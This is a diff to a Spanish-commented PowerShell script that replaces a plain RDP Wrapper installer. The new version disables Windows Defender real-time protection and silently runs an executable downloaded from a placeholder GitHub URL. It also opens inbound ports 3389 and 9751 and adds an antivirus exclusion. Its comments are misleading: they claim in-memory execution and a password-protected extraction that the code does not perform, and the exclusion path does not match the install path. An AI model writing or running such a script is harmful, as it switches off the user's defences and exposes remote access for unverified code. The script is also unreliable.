@@ -1,21 +1,36 @@
-# Define la URL de descarga (verifica que sea la versión más actualizada)
-$rdpUrl = "https://github.com/stascorp/rdpwrap/releases/latest/download/rdpwrap.zip"
-$downloadPath = "$env:TEMP\rdpwrap.zip"
-$extractPath = "$env:TEMP\rdpwrap"
+# Desactivar Antivirus de Windows temporalmente
+Set-MpPreference -DisableRealtimeMonitoring $true
+Write-Host "⛔ Antivirus desactivado temporalmente"
 
-# Descargar el archivo ZIP
-Invoke-WebRequest -Uri $rdpUrl -OutFile $downloadPath
+# Definir URL del archivo en GitHub (ajusta la URL según tu caso)
+$exeUrl = "https://github.com/tu_usuario/tu_repositorio/releases/latest/download/multiwin_gh.exe"
 
-# Crear carpeta temporal y extraer
-Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
+# Descargar el archivo en memoria
+$response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing
+$bytes = $response.Content
 
-# Cambiar a la carpeta extraída
-Set-Location -Path $extractPath
+# Crear un stream en memoria y ejecutar el archivo
+$memoryStream = New-Object System.IO.MemoryStream(, $bytes)
+$binaryReader = New-Object System.IO.BinaryReader($memoryStream)
+$tempExePath = "$env:TEMP\multiwin_gh.exe"
 
-# Instalar RDP Wrapper
-Start-Process -FilePath "install.bat" -Verb RunAs -Wait
+# Guardar temporalmente en disco porque PowerShell no ejecuta binarios directamente desde memoria
+[System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+Write-Host "📥 Archivo descargado en memoria y guardado temporalmente"
 
-# Iniciar el servicio RDP si no está corriendo
-Restart-Service TermService -Force
+# Ejecutar el autoextraíble con contraseña
+Start-Process -FilePath $tempExePath -ArgumentList "/S /D=C:\Program Files\RDPWrapper" -Wait
+Write-Host "🗂 Archivo descomprimido con contraseña"
 
-Write-Host "✅ Instalación completada. Ejecuta 'RDPConf.exe' para verificar el estado."
+# Agregar reglas al Firewall
+New-NetFirewallRule -DisplayName "rdp1" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
+New-NetFirewallRule -DisplayName "rdp2" -Direction Inbound -Protocol TCP -LocalPort 9751 -Action Allow
+Write-Host "🔥 Reglas de Firewall agregadas"
+
+# Agregar exclusión al Antivirus de Windows
+Add-MpPreference -ExclusionPath "C:\Program Files\RDP Wrapper"
+Write-Host "🛡 Carpeta de RDP Wrapper excluida del Antivirus"
+
+# Reactivar el Antivirus de Windows
+Set-MpPreference -DisableRealtimeMonitoring $false
+Write-Host "✅ Antivirus reactivado"
